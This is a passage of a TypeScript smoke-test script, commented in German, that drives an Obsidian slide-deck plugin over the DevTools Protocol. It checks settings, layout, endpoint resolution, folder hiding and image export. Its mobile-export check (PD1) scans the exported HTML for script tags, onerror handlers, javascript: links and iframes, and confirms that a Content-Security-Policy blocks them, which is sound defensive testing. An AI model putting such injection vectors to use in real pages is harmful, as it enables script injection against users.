 *  linke Kante — nebeneinander stehende Kinder teilen sich das `top` und unterscheiden sich
 *  im `left`, das ist der Fall, den 0.6.0 gezeigt hat. */
async function hostLayout(cdp: Cdp, ctx: Ctx): Promise<LayoutMessung> {
  const offen = await oeffneTab(cdp, ctx);
  try {
    return await offen.ziel.evaluate<LayoutMessung>(`
      const wurzel = document.querySelector(".vertical-tab-content-container .vertical-tab-content")
        ?? document.querySelector(".vertical-tab-content");
      const hosts = [];
      for (const h of (wurzel ? wurzel.querySelectorAll(".sd-settings-host") : [])) {
        const kinder = [...h.children].map((k) => k.getBoundingClientRect());
        const tops = new Set(kinder.map((r) => Math.round(r.top)));
        const lefts = new Set(kinder.map((r) => Math.round(r.left)));
        hosts.push({
          display: getComputedStyle(h).display,
          kinder: kinder.length,
          // Zwei Kinder mit gleichem top und verschiedenem left stehen nebeneinander; das
          // Gegenteil ist die Zusage. Bei einem einzigen Kind ist nichts zu stapeln — der
          // Host zaehlt dann nicht als Beleg, aber auch nicht als Defekt.
          stapelt: kinder.length >= 2 && tops.size === kinder.length && lefts.size === 1,
        });
      }
      const normal = wurzel ? wurzel.querySelector(".setting-item:not(.sd-settings-host)") : null;
      const normalDisplay = normal ? getComputedStyle(normal).display : "(keins gefunden)";
      return { hosts, normalIstFlex: normalDisplay === "flex", normalDisplay };
    `);
  } finally {
    await schliesseTab(cdp, offen);
  }
}

async function schliesseTab(cdp: Cdp, offen: OffenerTab): Promise<void> {
  if (offen.eigenesFenster) offen.ziel.close();
  await schliesseEinstellungen(cdp);
}

/** B — die Einstellungen. Ab Obsidian 1.13 ein eigenes Fenster; beide Faelle offen halten. */
const einstellungen: Section = {
  key: "einstellungen",
  title: "B · Einstellungen (i18n + Endpunkt-Editor)",
  async run(cdp, ctx) {
    const offen = await oeffneTab(cdp, ctx);
    const { tab, eigenesFenster } = offen;
    record(
      "B1 Einstellungen-Tab oeffnet",
      tab.gefunden,
      tab.gefunden
        ? `${eigenesFenster ? "eigenes Fenster" : "Modal im Hauptfenster"} · ${tab.text.length} Zeichen`
        : "kein Tab-Inhalt gefunden",
    );

    // B2 ist der Waechter fuer den Befund von CORE-TEST-04: `t()` faellt bei unbekanntem
    // Schluessel auf den SCHLUESSEL zurueck (erst EN, dann key) — in der Oberflaeche stand
    // dann "deck.settings.endpoint.status.unauthorized" und sah aus wie ein plausibler
    // String. Der Typecheck deckt seither die Endpunkt-Statusklassen ab; jeder andere
    // Schluessel faellt weiterhin nur hier auf.
    //
    // Zwei Suchen, weil ein Fall den anderen nicht abdeckt:
    //   (a) ein Schluessel, den es GIBT, aber der als Text erscheint (falscher Aufruf),
    //   (b) ein Schluessel, den es NICHT gibt — der steht per Definition nicht im
    //       Woerterbuch, also greift (a) nicht. Dafuer das Praefix-Muster, dessen
    //       Namensraeume aus demselben Woerterbuch kommen und mit ihm mitwandern.
    const rohe = tab.gefunden ? [...new Set([...bekannteSichtbar(tab.text), ...unbekannteSichtbar(tab.text)])] : [];
    record(
      "B2 Kein roher i18n-Schluessel in der Oberflaeche",
      tab.gefunden && rohe.length === 0,
      rohe.length ? `sichtbar: ${rohe.join(", ")}` : "keiner",
    );

    record(
      "B3 Endpunkt-Zeileneditor ist verdrahtet",
      tab.endpunkte > 0,
      tab.endpunkte > 0 ? `${tab.endpunkte} Zeile(n) (.okit-ep-row)` : "keine .okit-ep-row im Tab",
    );

    // B3b: Hilfe-Zeile (UI-STANDARD §8) ist die erste gezeichnete Zeile, mit Text-Knopf und bug-Icon.
    // Geklickt wird nicht — ein Klick oeffnet den System-Browser; die URLs prueft der Unit-Test.
    const hilfe = await offen.ziel.evaluate<{ name: string; knopf: boolean; bug: boolean } | null>(`
      const c = document.querySelector(".vertical-tab-content");
      const z = c && c.querySelector(".setting-item");
      if (!z) return null;
      const n = z.querySelector(".setting-item-name");
      return { name: n ? n.textContent : "", knopf: Boolean(z.querySelector("button")), bug: Boolean(z.querySelector(".clickable-icon")) };
    `);
    record(
      "B3b Hilfe-Zeile ist die erste Zeile im Einstellungs-Tab",
      hilfe !== null && /^(Help|Hilfe)$/.test(hilfe.name) && hilfe.knopf && hilfe.bug,
      JSON.stringify(hilfe),
    );
    const shotDir = process.env.SMOKE_SHOT_DIR;
    if (shotDir) writeFileSync(`${shotDir}/hilfe-zeile.png`, await capture(offen.ziel));

    await schliesseTab(cdp, offen);

    // B4 (Welle 17, Muster settings-assistant P19): das globale Modell ist abgeschafft. Ein Altwert in der
    // data.json zieht beim Laden EINMAL in die Zeilen ohne Modell, der Schluessel verschwindet, und der Tab
    // hat weder eine Zeile "Model" noch eine Option "global model". Der Punkt stellt den Altzustand selbst her
    // (data.json schreiben, Plugin neu laden) und setzt danach zurueck. Gegenprobe: mit dem Build davor
    // bleibt der Schluessel stehen und die Zeile ist da.
    const vorherig = await cdp.evaluate<string>(`
      return JSON.stringify(app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings);
    `);
    try {
      await cdp.evaluate(`
        const id = ${JSON.stringify(PLUGIN_ID)};
        const roh = JSON.parse(${JSON.stringify(vorherig)});
        roh.llmModel = "smoke/altwert-b4";
        roh.llmEndpoints = [{ url: "http://127.0.0.1:9" }, { url: "http://127.0.0.1:10", model: "eigenes/modell" }];
        await app.plugins.plugins[id].saveData(roh);
        await app.plugins.disablePlugin(id);
        await new Promise((r) => setTimeout(r, 400));
        await app.plugins.enablePlugin(id);
        await new Promise((r) => setTimeout(r, 800));
        return true;
      `);
      const nach = await cdp.evaluate<{ zeilen: Array<string | undefined>; schluessel: boolean }>(`
        const s = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings;
        return { zeilen: s.llmEndpoints.map((e) => e.model), schluessel: "llmModel" in s };
      `);
      const gespeichert = await cdp.evaluate<boolean>(`
        return !("llmModel" in (await app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].loadData()));
      `);
      await verbindungNeu(cdp);
      const offen = await oeffneTab(cdp, ctx);
      let hatZeile: boolean, hatOption: boolean;
      try {
        hatZeile = offen.tab.namen.some((n) => /^(Model|Modell)$/.test(n));
        hatOption = offen.tab.optionen.some((o) => /global model|globales Modell/i.test(o));
      } finally {
        await schliesseTab(cdp, offen);
      }
      record(
        "B4 Altwert llmModel zieht einmal in die Zeile ohne Modell; keine Zeile \"Model\", keine Option \"global model\"",
        nach.zeilen[0] === "smoke/altwert-b4" && nach.zeilen[1] === "eigenes/modell" && !nach.schluessel && gespeichert && !hatZeile && !hatOption,
        `Zeilen ${JSON.stringify(nach.zeilen)} · Schluessel im Speicher ${nach.schluessel} · in data.json ${!gespeichert} · Zeile Model ${hatZeile} · Option global ${hatOption}`,
      );
    } finally {
      await cdp.evaluate(`
        const id = ${JSON.stringify(PLUGIN_ID)};
        await app.plugins.plugins[id].saveData(JSON.parse(${JSON.stringify(vorherig)}));
        await app.plugins.disablePlugin(id);
        await new Promise((r) => setTimeout(r, 400));
        await app.plugins.enablePlugin(id);
        await new Promise((r) => setTimeout(r, 800));
        return true;
      `);
      await verbindungNeu(cdp);
    }

    // B5: die §8-Bloecke stapeln, statt in einer Flex-Row zu landen. Das Risiko aus 0.6.0:
    // `hostFor()` reicht EIN Setting an einen Block weiter, der darin MEHRERE Zeilen zeichnet
    // — Obsidians `.setting-item` ist aber `display:flex; flex-direction:row`, und ohne das
    // Strippen dieser Klasse (`settingBodyHost`) wuerden Endpunkt-Liste, Modellfeld und
    // Denk-Schalter nebeneinander stehen statt untereinander. Im Repo praezedenzlos, von
    // keinem Unit-Test erreichbar: es ist eine Aussage ueber gerechnetes Layout.
    const layout = await hostLayout(cdp, ctx);
    const kaputt = layout.hosts.filter((h) => h.display === "flex");
    const gestapelt = layout.hosts.filter((h) => h.stapelt);
    record(
      "B5 KI-Settings-Bloecke stapeln, statt eine Flex-Row zu werden",
      layout.hosts.length > 0 && kaputt.length === 0 && layout.normalIstFlex
        // Seit Welle 17 hat kein Host mehr zwei Kinder (die Modell-Zeile war der letzte): ohne mehrkindrigen Host
        // gibt es nichts zu stapeln, die Aussage tragen dann display (nicht flex) und die Gegenkontrolle.
        && (gestapelt.length > 0 || layout.hosts.every((h) => h.kinder < 2)),
      layout.hosts.length === 0
        ? "kein .sd-settings-host im Tab — der Punkt hat keinen Gegenstand"
        : !layout.normalIstFlex
          // Ohne diese Gegenkontrolle waere der Punkt tautologisch: in einer Obsidian-Version,
          // die `.setting-item` nicht mehr als Flex-Row zeichnet, waere "nicht flex" gratis
          // wahr und der Punkt gruen, ohne je etwas gemessen zu haben (Muster von A3).
          ? `Gegenkontrolle fehlgeschlagen: ein normales .setting-item ist hier "${layout.normalDisplay}", nicht flex — dann sagt "Host ist nicht flex" nichts aus`
          // Die display-Werte kommen aus der Messung, nicht aus dem Satz: eine erste Fassung
          // schrieb "alle display:block" fest und meldete das im roten Fall neben
          // "3 Host(s) sind flex" — ein Protokoll, das sich selbst widerspricht, kostet mehr
          // Zeit als eines, das schweigt.
          : `${layout.hosts.length} Host(s) display=[${layout.hosts.map((h) => h.display).join(", ")}]` +
            ` · ${gestapelt.length}/${layout.hosts.length} mit gestapelten Kindern` +
            (kaputt.length ? ` · ACHTUNG: ${kaputt.length} Host(s) sind flex` : "") +
            ` · Gegenkontrolle: normales .setting-item ist ${layout.normalDisplay}`,
    );
  },
};

/** E — Endpunkt-Quelle (Welle 8): ist der LLM Endpoint Manager installiert, kommen Endpunkt und
 *  Modell von ihm; sonst gilt die lokale Liste. Der Manager wird als FAKE-API in den Plugin-Slot
 *  gelegt (Form-Pruefung `isLlmEndpointManagerApi`), mit einer URL, die die lokale Liste nicht
 *  traegt — zwei verschiedene Werte im Protokoll sind der Beleg, dass gemessen wurde. */
const MGR_URL = "http://127.0.0.1:9311";
const MGR_MODEL = "sd-fake-modell";
const endpunktQuelle: Section = {
  key: "quelle",
  title: "E · Endpunkt-Quelle (LLM Endpoint Manager)",
  async run(cdp, ctx) {
    // Der Fake-Manager ist der zentrale aus der Bruecke (`tools/obsidian-cdp/fake-manager.ts`): `configModel: "keins"`, weil die
    // alte Fassung kein Modell in `config` trug; der Aufrufer waehlt das Modell ueber `defaultModel`.
    const installiere = (): Promise<unknown> =>
      installFakeManager(cdp, { endpunkte: [{ id: "fake1", label: "Fake-Endpunkt", url: MGR_URL, models: [MGR_MODEL], configModel: "keins" }], invalidiere: [PLUGIN_ID] });
    const entferne = (): Promise<unknown> => entferneFakeManager(cdp, { invalidiere: [PLUGIN_ID] });
    const aufloesung = (): Promise<{ kind: string; url: string | null; model: string }> => cdp.evaluate(`
      const r = await app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].llm.resolve();
      return { kind: r.kind, url: r.config ? r.config.url : null, model: r.model };
    `);
    const eigeneEndpunkte = await cdp.evaluate<{ url: string }[]>(`
      return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.llmEndpoints;
    `);
    const lokaleUrl = eigeneEndpunkte[0]?.url ?? "";

    await installiere();
    let mitManager: OffenerTab | null = null;
    try {
      mitManager = await oeffneTab(cdp, ctx);
      const text = mitManager.tab.text;
      const erwartet = [LLM_CONNECTION_STRINGS_EN.endpointSource.managed, LLM_CONNECTION_STRINGS_DE.endpointSource.managed];
      const zeigtBaustein = erwartet.some((e) => text.includes(e));
      record(
        "E1 Manager an: Settings zeigen den Manager-Baustein statt der lokalen Liste",
        mitManager.tab.gefunden && zeigtBaustein && mitManager.tab.endpunkte === 0,
        `Baustein ${zeigtBaustein ? "da" : "FEHLT"} · ${mitManager.tab.endpunkte} lokale Zeile(n) (.okit-ep-row) sichtbar`,
      );
      // Eine globale Modell-Zeile gibt es seit Welle 17 nirgends mehr; mit Manager waehlt der Baustein das Modell.
      record(
        "E1b Manager an: die Beschreibung der alten globalen Modell-Zeile steht nirgends im Tab",
        mitManager.tab.gefunden && !ALTE_MODELL_BESCHREIBUNG.some((b) => text.includes(b)),
        `Tab-Text ${mitManager.tab.text.length} Zeichen · Zeilen: ${JSON.stringify(mitManager.tab.namen.slice(0, 14))}`,
      );
      const r = await aufloesung();
      record(
        "E2 Manager an: die Aufloesung nimmt Manager-Endpunkt und Default-Modell",
        r.kind === "manager" && r.url === MGR_URL && r.model === MGR_MODEL,
        `${r.kind} · ${r.url} · Modell ${r.model} (lokal waere ${lokaleUrl})`,
      );
    } finally {
      if (mitManager) await schliesseTab(cdp, mitManager);
      await entferne();
    }

    const ohne = await oeffneTab(cdp, ctx);
    try {
      record("E3b Manager aus: auch ohne Manager steht die alte Modell-Zeile nirgends (das Modell steht in der Endpunkt-Zeile)",
        ohne.tab.gefunden && !ALTE_MODELL_BESCHREIBUNG.some((b) => ohne.tab.text.includes(b)), `Tab-Text ${ohne.tab.text.length} Zeichen`);
      const r = await aufloesung();
      record(
        "E3 Manager aus: lokale Liste in Settings und Aufloesung (Gegenprobe zu E1/E2)",
        ohne.tab.gefunden && ohne.tab.endpunkte > 0 && r.kind === "local" && r.url !== MGR_URL,
        `${ohne.tab.endpunkte} lokale Zeile(n) · ${r.kind} · ${r.url}`,
      );
    } finally {
      await schliesseTab(cdp, ohne);
    }
  },
};

const ORDNER_SEL = (pfad: string): string =>
  JSON.stringify(`.nav-folder-title[data-path=${JSON.stringify(pfad)}]`);

/** C — der Datei-Explorer. `data-path` ist internes Obsidian-Markup ohne API-Zusage; ein
 *  Unit-Test kann nur den CSS-String pruefen, nicht seine Wirkung im echten Explorer. */
const explorer: Section = {
  key: "explorer",
  title: "C · Themes-Ordner ausblenden",
  async run(cdp) {
    const ordner = await cdp.evaluate<string>(`
      return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.themesFolder;
    `);
    const angelegt = await cdp.evaluate<boolean>(`
      const pfad = ${JSON.stringify(ordner)};
      if (app.vault.getAbstractFileByPath(pfad)) return false;
      await app.vault.createFolder(pfad);
      await new Promise((r) => setTimeout(r, 800));
      return true;
    `);
    if (angelegt) erzeugtePfade.push(ordner);

    await setPluginSetting(cdp, PLUGIN_ID, "hideThemesFolder", true);
    await cdp.evaluate(`
      const plugin = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      if (typeof plugin.applyFolderHide === "function") plugin.applyFolderHide();
      await new Promise((r) => setTimeout(r, 600));
      return true;
    `);

    // Erst den Gegenstand belegen, dann die Eigenschaft messen: ein Vergleich gegen ein
    // nicht existierendes Element wird gruen — ausgerechnet im Defektfall.
    const versteckt = await cdp.evaluate<{ da: boolean; display: string }>(`
      const el = document.querySelector(${ORDNER_SEL(ordner)});
      return { da: Boolean(el), display: el ? getComputedStyle(el).display : "" };
    `);
    record(
      "C1 Themes-Ordner ist im Explorer ausgeblendet",
      versteckt.da && versteckt.display === "none",
      versteckt.da
        ? `Ordner "${ordner}", display: ${versteckt.display}`
        : "kein .nav-folder-title[data-path] fuer den Ordner — Markup geaendert oder Explorer zu",
    );

    await setPluginSetting(cdp, PLUGIN_ID, "hideThemesFolder", false);
    await cdp.evaluate(`
      const plugin = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      if (typeof plugin.applyFolderHide === "function") plugin.applyFolderHide();
      await new Promise((r) => setTimeout(r, 600));
      return true;
    `);
    const wiederDa = await cdp.evaluate<{ da: boolean; display: string }>(`
      const el = document.querySelector(${ORDNER_SEL(ordner)});
      return { da: Boolean(el), display: el ? getComputedStyle(el).display : "" };
    `);
    record(
      "C2 Ausschalten macht ihn wieder sichtbar",
      wiederDa.da && wiederDa.display !== "none",
      wiederDa.da ? `display: ${wiederDa.display}` : "Ordner-Eintrag nicht gefunden",
    );

    // C3 — Realm-Falle (0.4.0/0.5.0/0.6.1): bei fokussiertem Pop-out muss das Blatt im
    // Hauptfenster (`rootSplit.doc`) landen, nie im Pop-out. Pop-outs eines frueheren Laufs
    // zuerst schliessen (ein Treiber setzt seinen Zustand VOR dem Lauf zurueck).
    await setPluginSetting(cdp, PLUGIN_ID, "hideThemesFolder", true);
    const popout = await cdp.evaluate<{ haupt: number; pop: number; popDa: boolean; regel: boolean }>(`
      const wait = (ms) => new Promise((r) => setTimeout(r, ms));
      for (const l of app.workspace.getLeavesOfType("empty")) l.detach();
      const alte = app.workspace.floatingSplit?.children ?? [];
      for (const c of [...alte]) c.children?.forEach((l) => l.detach());
      await wait(300);
      const leaf = app.workspace.openPopoutLeaf();
      await wait(1200);
      const popDoc = leaf.view.containerEl.ownerDocument;
      popDoc.defaultView.focus();
      await wait(300);
      const id = ${JSON.stringify(PLUGIN_ID)};
      await app.plugins.disablePlugin(id);
      await wait(400);
      await app.plugins.enablePlugin(id);
      await wait(1000);
      const haupt = app.workspace.rootSplit.doc;
      const regel = [...haupt.adoptedStyleSheets].some((sh) => [...sh.cssRules].some((r) => r.cssText.includes("data-path")));
      const popHat = [...popDoc.adoptedStyleSheets].some((sh) => [...sh.cssRules].some((r) => r.cssText.includes("data-path")));
      const out = { haupt: haupt.adoptedStyleSheets.length, pop: popDoc.adoptedStyleSheets.length, popDa: popHat, regel, istHaupt: popDoc !== haupt };
      leaf.detach();
      return out;
    `);
    record(
      "C3 Bei fokussiertem Pop-out liegt das Blatt im Hauptfenster, nicht im Pop-out",
      popout.regel && !popout.popDa,
      `Hauptfenster: ${popout.haupt} Blatt, Regel ${popout.regel} · Pop-out: ${popout.pop} Blatt, Regel ${popout.popDa}`,
    );
    await setPluginSetting(cdp, PLUGIN_ID, "hideThemesFolder", false);
    await cdp.evaluate(`app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].applyFolderHide(); return true;`);
    // Das Wiederaktivieren stellt das Hub-Blatt aus dem Layout wieder her; sein Erzeugen-Panel loest den Endpunkt EINMAL beim
    // Oeffnen auf — also mit dem, was das Plugin beim Neuladen aus data.json las — und merkt sich das Ergebnis. Ein spaeterer
    // Abschnitt, der Endpunkte setzt (G), schaltet danach nur den Tab um und sieht „No endpoint reachable“ (gemessen 2026-10-14:
    // verbindung + explorer + chat → G4–G8 nichts gemessen; ohne das Wiederaktivieren oder ohne den Hub-oeffnenden Abschnitt
    // gruen). Der Abschnitt, der den Zustand verursacht, raeumt ihn auch ab (CORE-TEST-21).
    await cdp.evaluate(`app.workspace.detachLeavesOfType("slide-deck-hub"); await new Promise((r) => setTimeout(r, 300)); return true;`);
  },
};

/** D — der Bilder-Export. Zweiter Kernpfad: dasselbe iframe-Artefakt wie die Vorschau,
 *  aufgenommen mit `modern-screenshot`. PDF bleibt Handarbeit — `contentWindow.print()`
 *  oeffnet einen modalen Systemdialog und der blockiert jede weitere CDP-Nachricht. */
const exportSektion: Section = {
  key: "export",
  title: "D · Bilder-Export",
  async run(cdp) {
    skipped("PDF-Export", "oeffnet den Systemdruckdialog — modal, blockiert CDP; bleibt Hand-Smoke");

    const zielOrdner = await cdp.evaluate<string>(`
      return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.exportFolder;
    `);
    // exportImages legt je Notiz einen Unterordner an: <exportFolder>/<basename>/NN-<basename>.png.
    // Ein Prüfpunkt auf den Wurzelordner fände dort nur den Unterordner und zaehlte 0 PNG —
    // gruen waere er nie geworden, aber die rote Zeile haette auf den Export gezeigt statt
    // auf sich selbst.
    const bildOrdner = `${zielOrdner}/${DECK_NOTE.replace(/\.md$/, "")}`;

    /** Den Ziel-Unterordner leeren, BEVOR exportiert wird.
     *
     *  ⚠️ Ohne das misst der Punkt womoeglich das Artefakt des Vorlaufs: die Wartebedingung
     *  unten ist `exists` + `size > 1024`, und beides erfuellt eine alte Datei **sofort** —
     *  der Poll kehrt zurueck, bevor der laufende Export geschrieben hat. Der Punkt ist dann
     *  gruen und hat den aktuellen Build nie gesehen. Aufgeraeumt wird zwar am Ende des
     *  Laufs, aber genau dann nicht, wenn es darauf ankommt: bei `--keep`, nach einem
     *  Abbruch (der Aufraeum-Block haengt an `.catch`) oder wenn eine Datei dem Index fehlt.
     *
     *  Nach dem Loeschen kann eine gefundene Datei nur die neue sein. Dieselbe Bewegung wie
     *  in Abschnitt M (`pieVollePixel`) und bei B4: ein Pruefpunkt stellt seinen Gegenstand
     *  selbst her, statt ihn von der Umgebung zu erwarten. */
    const leereExport = async (ordner: string): Promise<void> => {
      await cdp.evaluate(`
        const adapter = app.vault.adapter;
        const ordner = ${JSON.stringify(ordner)};
        if (await adapter.exists(ordner)) await adapter.rmdir(ordner, true);
        return true;
      `);
      await clearNotices(cdp);
    };

    await openPreview(cdp, DECK_NOTE);
    // `leereExport` raeumt zweierlei weg, und beides aus demselben Grund — der Punkt soll
    // nichts messen, was vor ihm da war: das Artefakt des Vorlaufs (s. o.) und Obsidians
    // Toast, der app-weit ist und in den jedes Plugin im Vault schreibt.
    await leereExport(bildOrdner);
    await cdp.evaluate(`
      await app.commands.executeCommandById("${PLUGIN_ID}:export-images");
      return true;
    `);
    // Über den ADAPTER zaehlen, nicht ueber getAbstractFileByPath: `exportImages` schreibt
    // mit `adapter.writeBinary`, und Obsidians Datei-Index kennt die neuen Dateien erst nach
    // seinem naechsten Lauf. Ein Punkt auf dem Index misst hier die Indizierung, nicht den Export.
    const bilder = await pollUntil<number>(cdp, `
      const adapter = app.vault.adapter;
      if (!(await adapter.exists(${JSON.stringify(bildOrdner)}))) return 0;
      const liste = await adapter.list(${JSON.stringify(bildOrdner)});
      let voll = 0;
      for (const datei of liste.files) {
        if (!datei.endsWith(".png")) continue;
        const s = await adapter.stat(datei);
        if (s && s.size > 1024) voll++;
      }
      return voll >= ${DECK_SLIDES} ? voll : 0;
    `, 90_000, 2000);
    const meldung = await notices(cdp);
    if (bilder && !erzeugtePfade.includes(zielOrdner)) erzeugtePfade.push(zielOrdner);
    record(
      `D1 Bilder-Export schreibt ${DECK_SLIDES} PNG in den Export-Ordner`,
      bilder === DECK_SLIDES,
      bilder
        ? `${bilder} PNG > 1 KB in "${bildOrdner}"${meldung ? ` · Meldung: ${meldung}` : ""}`
        : `keine vollstaendige Serie${meldung ? ` · Meldung: ${meldung}` : " · keine Meldung des Pruflings"}` +
          ` · ${await diagnose(cdp)}`,
    );

    // D2: die Modifier-Klasse ueberlebt den Export — bisher nur strukturell belegt (sie steht
    // im serialisierten slidesHtml). Gemessen wird am ARTEFAKT: eine Probe-Regel im
    // customCss faerbt `.sd-mod-sand` in eine Farbe, die kein Theme traegt, und das PNG der
    // Modifier-Folie muss sie tragen, das einer Nachbarfolie nicht. Die Pixel werden im
    // Renderer aus den geschriebenen Dateien gelesen (adapter → Blob → ImageBitmap), nicht
    // aus dem iframe, den der Export gleich wieder wegwirft.
    await ensureRegressionNote(cdp);
    if (!(await openExisting(cdp, REGRESSION_NOTE, "source"))) throw new Error(`Notiz fehlt im Vault: ${REGRESSION_NOTE}`);
    await setPluginSetting(cdp, PLUGIN_ID, "customCss", MOD_PROBE_CSS);
    const regOrdner = `${zielOrdner}/${REGRESSION_NOTE.replace(/\.md$/, "")}`;
    await leereExport(regOrdner);
    await cdp.evaluate(`
      await app.commands.executeCommandById("${PLUGIN_ID}:export-images");
      return true;
    `);
    const pixel = await pollUntil<{ mod: number[]; nachbar: number[] } | null>(cdp, `
      const adapter = app.vault.adapter;
      const base = ${JSON.stringify(REGRESSION_NOTE.replace(/\.md$/, ""))};
      const pfad = (i) => ${JSON.stringify(regOrdner)} + "/" + String(i + 1).padStart(2, "0") + "-" + base + ".png";
      const lies = async (i) => {
        if (!(await adapter.exists(pfad(i)))) return null;
        const s = await adapter.stat(pfad(i));
        if (!s || s.size < 1024) return null;
        const bytes = await adapter.readBinary(pfad(i));
        const bmp = await createImageBitmap(new Blob([bytes], { type: "image/png" }));
        const c = document.createElement("canvas"); c.width = bmp.width; c.height = bmp.height;
        const ctx = c.getContext("2d"); ctx.drawImage(bmp, 0, 0);
        // Linker Rand, halbe Hoehe: Folienhintergrund, kein Inhalt, keine Kopf-/Fusszeile.
        const d = ctx.getImageData(4, Math.floor(bmp.height / 2), 1, 1).data;
        return [d[0], d[1], d[2]];
      };
      const letzte = await lies(${REGRESSION_SLIDES - 1});   // erst wenn die Serie komplett ist
      if (!letzte) return null;
      const mod = await lies(${REGRESSION_MOD_SLIDE});
      const nachbar = await lies(${REGRESSION_MOD_SLIDE - 1});
      return mod && nachbar ? { mod, nachbar } : null;
    `, 90_000, 2000);
    const meldung2 = await notices(cdp);
    if (pixel && !erzeugtePfade.includes(zielOrdner)) erzeugtePfade.push(zielOrdner);
    const nah = (a: number[], b: number[]): boolean => a.every((v, i) => Math.abs(v - b[i]) <= 8);
    const modGefaerbt = Boolean(pixel) && nah(pixel!.mod, MOD_PROBE_RGB);
    const nachbarNicht = Boolean(pixel) && !nah(pixel!.nachbar, MOD_PROBE_RGB);
    record(
      `D2 Modifier-Klasse ueberlebt den Export (Folie ${REGRESSION_MOD_SLIDE + 1} traegt die Probe-Farbe im PNG)`,
      modGefaerbt && nachbarNicht,
      pixel
        ? `Folie ${REGRESSION_MOD_SLIDE + 1} rgb(${pixel.mod.join(",")}) · Nachbar rgb(${pixel.nachbar.join(",")}) · Probe rgb(${MOD_PROBE_RGB.join(",")})` +
          (modGefaerbt ? "" : " · ACHTUNG: Modifier-Folie traegt die Farbe nicht") +
          (nachbarNicht ? "" : " · ACHTUNG: Nachbarfolie traegt sie auch — die Probe misst nicht den Modifier")
        : `keine vollstaendige Serie${meldung2 ? ` · Meldung: ${meldung2}` : ""} · ${await diagnose(cdp)}`,
    );

    // PD1: der mobile Zweig ist auf dem Desktop nicht anwaehlbar (`app.emulateMobile` aendert `Platform.isDesktopApp`
    // nicht, gemessen 2026-10-25), also waehlt der Punkt ihn ueber `plugin.exportPdf({ mobile: true })` — dieselbe
    // Funktion, derselbe Schreibweg, nur die Weiche ist vorgegeben. `openWithDefaultApp` wird ersetzt (es wuerde den
    // Browser des Rechners oeffnen) und danach entfernt. Die Datei laeuft dann in einem Rahmen OHNE sandbox: dort
    // zaehlt allein die Policy. Gegenprobe im selben Punkt: dieselbe Datei ohne das meta laesst alle vier Muster laufen.
    await cdp.evaluate(`
      const pfad = ${JSON.stringify(PD1_NOTE)};
      const inhalt = ${JSON.stringify(PD1_MD)};
      const da = app.vault.getAbstractFileByPath(pfad);
      if (da) await app.vault.modify(da, inhalt); else await app.vault.create(pfad, inhalt);
      await new Promise((r) => setTimeout(r, 600));
      return true;
    `);
    erzeugtePfade.push(PD1_NOTE);
    if (!(await openExisting(cdp, PD1_NOTE, "source"))) throw new Error(`Notiz fehlt im Vault: ${PD1_NOTE}`);
    await setPluginSetting(cdp, PLUGIN_ID, "customCss", "");
    const pdDatei = `${zielOrdner}/${PD1_NOTE.replace(/\.md$/, "")}.html`;
    await cdp.evaluate(`
      const adapter = app.vault.adapter;
      if (await adapter.exists(${JSON.stringify(pdDatei)})) await adapter.remove(${JSON.stringify(pdDatei)});
      globalThis.__pdGeoeffnet = [];
      app.openWithDefaultApp = async (p) => { globalThis.__pdGeoeffnet.push(p); };
      return true;
    `);
    await clearNotices(cdp);
    try {
      await cdp.evaluate(`await app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].exportPdf({ mobile: true }); return true;`);
      const pd = await pollUntil<{
        geoeffnet: string[]; vorkommen: Record<string, boolean>; mitPolicy: { marken: string[]; katex: number; svg: number; bild: number; httpsVerletzung: number; httpVerletzung: number };
        ohnePolicy: { marken: string[]; httpVerletzung: number }; metaEntfernt: boolean; meta: number;
      } | null>(cdp, `
        const adapter = app.vault.adapter;
        if (!(await adapter.exists(${JSON.stringify(pdDatei)}))) return null;
        const html = await adapter.read(${JSON.stringify(pdDatei)});
        if (html.length < 2000) return null;
        const vorkommen = {
          script: /<script/i.test(html), onerror: /onerror=/i.test(html),
          link: /href="javascript:/i.test(html), iframe: /<iframe/i.test(html),
        };
        const meta = (html.match(/http-equiv="Content-Security-Policy"/g) || []).length;
        const ohne = html.replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, "");
        const metaEntfernt = ohne !== html;
        const lauf = async (quelltext) => {
          const f = document.createElement("iframe");
          f.style.cssText = "position:fixed;left:8px;top:8px;width:min(1300px,96vw);height:min(740px,90vh);z-index:99999;background:#fff;border:0";
          document.body.appendChild(f);
          const geladen = new Promise((r) => f.addEventListener("load", () => r(), { once: true }));
          f.srcdoc = quelltext;
          await geladen;
          await f.contentDocument.fonts.ready;
          const d = f.contentDocument, w = f.contentWindow;
          const verletzungen = [];
          d.addEventListener("securitypolicyviolation", (e) => verletzungen.push(e.effectiveDirective + " " + e.blockedURI));
          const a = d.getElementById("pd-link"); if (a) a.click();
          await new Promise((r) => setTimeout(r, 600));
          // img-src nachmessen: ein https- und ein http-Bild von Hand setzen, die Verletzungen zaehlen
          for (const url of ["https://pd1.invalid/x.png", "http://127.0.0.1:9/x.png"]) {
            const im = d.createElement("img"); im.setAttribute("data-pd", "1"); im.src = url; d.body.appendChild(im);
          }
          await new Promise((r) => setTimeout(r, 600));
          d.querySelectorAll("img[data-pd]").forEach((i) => i.remove());   // Probebilder raus, bevor aufgenommen wird
          const zaehle = (muster) => verletzungen.filter((v) => v.startsWith("img-src") && v.includes(muster)).length;
          return { f, w, d, marken: Object.keys(w).filter((k) => k.startsWith("__pd_")).map((k) => k.slice(5)), httpsVerletzung: zaehle("https:"), httpVerletzung: zaehle("http://"), verletzungen };
        };
        const mit = await lauf(html);
        const mitErgebnis = {
          marken: mit.marken, katex: mit.d.querySelectorAll(".katex").length, svg: mit.d.querySelectorAll(".sd-mermaid svg").length,
          bild: Array.from(mit.d.querySelectorAll("img")).filter((i) => i.src.startsWith("data:image/png") && i.naturalWidth > 0).length,
          httpsVerletzung: mit.httpsVerletzung, httpVerletzung: mit.httpVerletzung,
        };
        globalThis.__pdRahmen = mit.f;   // fuer die Aufnahme; danach entfernt
        const ohnePolicy = await lauf(ohne);
